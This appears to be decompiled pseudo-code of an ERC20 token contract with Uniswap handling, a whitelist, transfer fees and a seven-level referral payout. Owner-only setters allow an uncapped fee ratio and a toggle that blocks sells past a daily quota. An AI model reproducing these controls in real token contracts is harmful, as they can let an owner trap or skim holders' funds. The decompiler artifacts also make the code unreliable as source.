contract main {




// =====================  Runtime code  =====================


#
#  - transfer(address arg1, uint256 arg2)
#
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
array of struct stor3;
array of struct stor4;
uint8 decimals;
address owner; offset 8
mapping of uint8 stor6;
address uniswapV2PairAddress;
uint256 sub_1c1252f5;
uint256 sub_ebd17b24;
uint256 sub_550eafef;
uint256 sub_c5aed875;
uint8 sub_5045964a;
address stor12;
address sub_bcabc258Address; offset 8
address sub_927f3d41Address;
mapping of uint256 sub_f5216623;
mapping of uint256 sub_99feb13a;
mapping of address parent;
mapping of uint256 sub_a4087f6c;

function totalSupply() {
    return totalSupply
}

function sub_1c1252f5(?) {
    return sub_1c1252f5
}

function decimals() {
    return decimals
}

function uniswapV2Pair() {
    return uniswapV2PairAddress
}

function sub_5045964a(?) {
    return bool(sub_5045964a)
}

function sub_550eafef(?) {
    return sub_550eafef
}

function isWhiteListed(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor6[address(arg1)])
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function sub_927f3d41(?) {
    return sub_927f3d41Address
}

function sub_99feb13a(?) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return sub_99feb13a[arg1]
}

function parentAddress(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return parent[arg1]
}

function sub_a4087f6c(?) {
    require calldata.size - 4 >= 32
    require arg1 == uint32(arg1)
    return sub_a4087f6c[arg1]
}

function Owner() {
    return owner
}

function sub_bcabc258(?) {
    return sub_bcabc258Address
}

function sub_c5aed875(?) {
    return sub_c5aed875
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function sub_ebd17b24(?) {
    return sub_ebd17b24
}

function sub_f5216623(?) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return sub_f5216623[arg1]
}

function _fallback() payable {
    revert
}

function isOwner() {
    return (owner == msg.sender)
}

function renounceOwnership() {
    if owner != msg.sender:
        revert with 0, '!owner'
    owner = 0
    emit LogOwnerChanged(owner, 0);
}

function sub_20ddc2d4(?) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, '!owner'
    sub_c5aed875 = arg1
}

function sub_312890e4(?) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, '!owner'
    sub_550eafef = arg1
}

function sub_db98a312(?) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, '!owner'
    sub_ebd17b24 = arg1
}

function setFeeRatio(uint256 arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, '!owner'
    sub_1c1252f5 = arg1
}

function sub_5001bd63(?) {
    require calldata.size - 4 >= 32
    require arg1 == bool(arg1)
    if owner != msg.sender:
        revert with 0, '!owner'
    sub_5045964a = uint8(bool(arg1))
}

function setPoolAddress(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, '!owner'
    sub_bcabc258Address = arg1
}

function sub_9fa8fc80(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    if owner != msg.sender:
        revert with 0, '!owner'
    sub_927f3d41Address = address(arg1)
}

function sub_267629c1(?) {
    require calldata.size - 4 >= 64
    require arg1 == uint32(arg1)
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, '!owner'
    sub_a4087f6c[arg1 << 224] = arg2
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, '!owner'
    if not arg1:
        revert with 0, '!address'
    owner = arg1
    emit LogOwnerChanged(owner, arg1);
}

function setWhiteList(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, '!owner'
    stor6[address(arg1)] = uint8(arg2)
    emit 0xc3f09c45: arg2, arg1
    return bool(stor6[address(arg1)])
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if allowance[address(msg.sender)][address(arg1)] > -arg2 - 1:
        revert with 'NH{q', 17
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if allowance[address(msg.sender)][address(arg1)] < arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: decreased allowance below zero'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function name() {
    if bool(stor3.length):
        if bool(stor3.length) == stor3.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor3.length):
            if bool(stor3.length) == stor3.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor3.length.field_1:
                if 31 < stor3.length.field_1:
                    mem[128] = uint256(stor3.field_0)
                    idx = 128
                    s = 0
                    while stor3.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor3[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor3.length.field_1), data=mem[128 len ceil32(stor3.length.field_1)])
                mem[128] = 256 * stor3.length.field_8
        else:
            if bool(stor3.length) == stor3.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor3.length.field_1:
                if 31 < stor3.length.field_1:
                    mem[128] = uint256(stor3.field_0)
                    idx = 128
                    s = 0
                    while stor3.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor3[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor3.length.field_1), data=mem[128 len ceil32(stor3.length.field_1)])
                mem[128] = 256 * stor3.length.field_8
        mem[ceil32(stor3.length.field_1) + 192 len ceil32(stor3.length.field_1)] = mem[128 len ceil32(stor3.length.field_1)]
        if ceil32(stor3.length.field_1) > stor3.length.field_1:
            mem[ceil32(stor3.length.field_1) + stor3.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor3.length.field_1), data=mem[128 len ceil32(stor3.length.field_1)], mem[(2 * ceil32(stor3.length.field_1)) + 192 len 2 * ceil32(stor3.length.field_1)]), 
    if bool(stor3.length) == stor3.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor3.length):
        if bool(stor3.length) == stor3.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor3.length.field_1:
            if 31 < stor3.length.field_1:
                mem[128] = uint256(stor3.field_0)
                idx = 128
                s = 0
                while stor3.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor3[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor3.length % 128, data=mem[128 len ceil32(stor3.length.field_1)])
            mem[128] = 256 * stor3.length.field_8
    else:
        if bool(stor3.length) == stor3.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor3.length.field_1:
            if 31 < stor3.length.field_1:
                mem[128] = uint256(stor3.field_0)
                idx = 128
                s = 0
                while stor3.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor3[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor3.length % 128, data=mem[128 len ceil32(stor3.length.field_1)])
            mem[128] = 256 * stor3.length.field_8
    mem[ceil32(stor3.length.field_1) + 192 len ceil32(stor3.length.field_1)] = mem[128 len ceil32(stor3.length.field_1)]
    if ceil32(stor3.length.field_1) > stor3.length.field_1:
        mem[ceil32(stor3.length.field_1) + stor3.length.field_1 + 192] = 0
    return Array(len=stor3.length % 128, data=mem[128 len ceil32(stor3.length.field_1)], mem[(2 * ceil32(stor3.length.field_1)) + 192 len 2 * ceil32(stor3.length.field_1)]), 
}

function symbol() {
    if bool(stor4.length):
        if bool(stor4.length) == stor4.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor4.length):
            if bool(stor4.length) == stor4.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor4.length.field_1:
                if 31 < stor4.length.field_1:
                    mem[128] = uint256(stor4.field_0)
                    idx = 128
                    s = 0
                    while stor4.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor4[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor4.length.field_1), data=mem[128 len ceil32(stor4.length.field_1)])
                mem[128] = 256 * stor4.length.field_8
        else:
            if bool(stor4.length) == stor4.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor4.length.field_1:
                if 31 < stor4.length.field_1:
                    mem[128] = uint256(stor4.field_0)
                    idx = 128
                    s = 0
                    while stor4.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor4[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor4.length.field_1), data=mem[128 len ceil32(stor4.length.field_1)])
                mem[128] = 256 * stor4.length.field_8
        mem[ceil32(stor4.length.field_1) + 192 len ceil32(stor4.length.field_1)] = mem[128 len ceil32(stor4.length.field_1)]
        if ceil32(stor4.length.field_1) > stor4.length.field_1:
            mem[ceil32(stor4.length.field_1) + stor4.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor4.length.field_1), data=mem[128 len ceil32(stor4.length.field_1)], mem[(2 * ceil32(stor4.length.field_1)) + 192 len 2 * ceil32(stor4.length.field_1)]), 
    if bool(stor4.length) == stor4.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor4.length):
        if bool(stor4.length) == stor4.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor4.length.field_1:
            if 31 < stor4.length.field_1:
                mem[128] = uint256(stor4.field_0)
                idx = 128
                s = 0
                while stor4.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor4[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor4.length % 128, data=mem[128 len ceil32(stor4.length.field_1)])
            mem[128] = 256 * stor4.length.field_8
    else:
        if bool(stor4.length) == stor4.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor4.length.field_1:
            if 31 < stor4.length.field_1:
                mem[128] = uint256(stor4.field_0)
                idx = 128
                s = 0
                while stor4.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor4[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor4.length % 128, data=mem[128 len ceil32(stor4.length.field_1)])
            mem[128] = 256 * stor4.length.field_8
    mem[ceil32(stor4.length.field_1) + 192 len ceil32(stor4.length.field_1)] = mem[128 len ceil32(stor4.length.field_1)]
    if ceil32(stor4.length.field_1) > stor4.length.field_1:
        mem[ceil32(stor4.length.field_1) + stor4.length.field_1 + 192] = 0
    return Array(len=stor4.length % 128, data=mem[128 len ceil32(stor4.length.field_1)], mem[(2 * ceil32(stor4.length.field_1)) + 192 len 2 * ceil32(stor4.length.field_1)]), 
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if allowance[address(arg1)][address(msg.sender)] != -1:
        if allowance[address(arg1)][address(msg.sender)] < arg3:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
        if not msg.sender:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
        allowance[address(arg1)][address(msg.sender)] -= arg3
        emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
    if sub_5045964a:
        if arg2 == uniswapV2PairAddress:
            if not stor6[address(arg1)]:
                if not stor6[address(arg2)]:
                    if block.timestamp > -28801:
                        revert with 'NH{q', 17
                    if block.timestamp < block.timestamp + (8 * 3600) % 24 * 3600:
                        revert with 'NH{q', 17
                    if sub_f5216623[block.timestamp - (block.timestamp + (8 * 3600) % 24 * 3600)] and sub_c5aed875 > -1 / sub_f5216623[block.timestamp - (block.timestamp + (8 * 3600) % 24 * 3600)]:
                        revert with 'NH{q', 17
                    if sub_99feb13a[block.timestamp - (block.timestamp + (8 * 3600) % 24 * 3600)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    if sub_99feb13a[block.timestamp - (block.timestamp + (8 * 3600) % 24 * 3600)] + arg3 > sub_f5216623[block.timestamp - (block.timestamp + (8 * 3600) % 24 * 3600)] * sub_c5aed875 / 100:
                        revert with 0, 'Insufficient sales quota'
    if balanceOf[address(arg1)] < arg3:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
    balanceOf[address(arg1)] -= arg3
    if not parent[address(arg2)]:
        if arg2 != uniswapV2PairAddress:
            if arg1 != uniswapV2PairAddress:
                parent[address(arg2)] = arg1
            else:
                parent[address(arg2)] = sub_927f3d41Address
    if stor6[address(arg1)]:
        if balanceOf[address(arg2)] > -arg3 - 1:
            revert with 'NH{q', 17
        balanceOf[address(arg2)] += arg3
        emit Transfer(arg3, arg1, arg2);
    else:
        if stor6[address(arg2)]:
            if balanceOf[address(arg2)] > -arg3 - 1:
                revert with 'NH{q', 17
            balanceOf[address(arg2)] += arg3
            emit Transfer(arg3, arg1, arg2);
        else:
            if arg2 == uniswapV2PairAddress:
                if block.timestamp > -28801:
                    revert with 'NH{q', 17
                if block.timestamp < block.timestamp + (8 * 3600) % 24 * 3600:
                    revert with 'NH{q', 17
                if sub_99feb13a[block.timestamp - (block.timestamp + (8 * 3600) % 24 * 3600)] > -arg3 - 1:
                    revert with 'NH{q', 17
                sub_99feb13a[block.timestamp - (block.timestamp + (8 * 3600) % 24 * 3600)] += arg3
            if arg1 == uniswapV2PairAddress:
                if block.timestamp > -28801:
                    revert with 'NH{q', 17
                if block.timestamp < block.timestamp + (8 * 3600) % 24 * 3600:
                    revert with 'NH{q', 17
                if sub_f5216623[block.timestamp - (block.timestamp + (8 * 3600) % 24 * 3600)] > -arg3 - 1:
                    revert with 'NH{q', 17
                sub_f5216623[block.timestamp - (block.timestamp + (8 * 3600) % 24 * 3600)] += arg3
            if arg3 and sub_1c1252f5 > -1 / arg3:
                revert with 'NH{q', 17
            if arg3 < arg3 * sub_1c1252f5 / 100:
                revert with 'NH{q', 17
            if arg3 and sub_ebd17b24 > -1 / arg3:
                revert with 'NH{q', 17
            if balanceOf[1] > -(arg3 * sub_ebd17b24 / 100) - 1:
                revert with 'NH{q', 17
            balanceOf[1] += arg3 * sub_ebd17b24 / 100
            if arg3 and sub_550eafef > -1 / arg3:
                revert with 'NH{q', 17
            if balanceOf[stor12] > -(arg3 * sub_550eafef / 100) - 1:
                revert with 'NH{q', 17
            balanceOf[stor12] += arg3 * sub_550eafef / 100
            emit Transfer((arg3 * sub_ebd17b24 / 100), arg1, 1);
            emit Transfer((arg3 * sub_550eafef / 100), arg1, sub_bcabc258Address);
            if arg1 != uniswapV2PairAddress:
                idx = 1
                while uint32(idx) <= 7:
                    if arg3 and sub_a4087f6c[idx << 224] > -1 / arg3:
                        revert with 'NH{q', 17
                    if parent[address(arg1)]:
                        mem[0] = parent[address(arg1)]
                        mem[32] = 0
                        if balanceOf[stor16[address(arg1)]] > -(arg3 * sub_a4087f6c[idx << 224] / 1000) - 1:
                            revert with 'NH{q', 17
                        balanceOf[stor16[address(arg1)]] += arg3 * sub_a4087f6c[idx << 224] / 1000
                        mem[96] = arg3 * sub_a4087f6c[idx << 224] / 1000
                        emit Transfer((arg3 * sub_a4087f6c[idx << 224] / 1000), arg1, parent[address(arg1)]);
                    else:
                        mem[0] = sub_927f3d41Address
                        mem[32] = 0
                        if balanceOf[stor13] > -(arg3 * sub_a4087f6c[idx << 224] / 1000) - 1:
                            revert with 'NH{q', 17
                        balanceOf[stor13] += arg3 * sub_a4087f6c[idx << 224] / 1000
                        mem[96] = arg3 * sub_a4087f6c[idx << 224] / 1000
                        emit Transfer((arg3 * sub_a4087f6c[idx << 224] / 1000), arg1, sub_927f3d41Address);
                    if uint32(idx) == test266151307():
                        revert with 'NH{q', 17
                    idx = uint32(idx) + 1
                    continue 
            else:
                idx = 1
                while uint32(idx) <= 7:
                    if arg3 and sub_a4087f6c[idx << 224] > -1 / arg3:
                        revert with 'NH{q', 17
                    if parent[address(arg2)]:
                        mem[0] = parent[address(arg2)]
                        mem[32] = 0
                        if balanceOf[stor16[address(arg2)]] > -(arg3 * sub_a4087f6c[idx << 224] / 1000) - 1:
                            revert with 'NH{q', 17
                        balanceOf[stor16[address(arg2)]] += arg3 * sub_a4087f6c[idx << 224] / 1000
                        mem[96] = arg3 * sub_a4087f6c[idx << 224] / 1000
                        emit Transfer((arg3 * sub_a4087f6c[idx << 224] / 1000), arg1, parent[address(arg2)]);
                    else:
                        mem[0] = sub_927f3d41Address
                        mem[32] = 0
                        if balanceOf[stor13] > -(arg3 * sub_a4087f6c[idx << 224] / 1000) - 1:
                            revert with 'NH{q', 17
                        balanceOf[stor13] += arg3 * sub_a4087f6c[idx << 224] / 1000
                        mem[96] = arg3 * sub_a4087f6c[idx << 224] / 1000
                        emit Transfer((arg3 * sub_a4087f6c[idx << 224] / 1000), arg1, sub_927f3d41Address);
                    if uint32(idx) == test266151307():
                        revert with 'NH{q', 17
                    idx = uint32(idx) + 1
                    continue 
            if balanceOf[address(arg2)] > -arg3 + (arg3 * sub_1c1252f5 / 100) - 1:
                revert with 'NH{q', 17
            balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_1c1252f5 / 100)
            emit Transfer((arg3 - (arg3 * sub_1c1252f5 / 100)), arg1, arg2);
    return 1
}



}
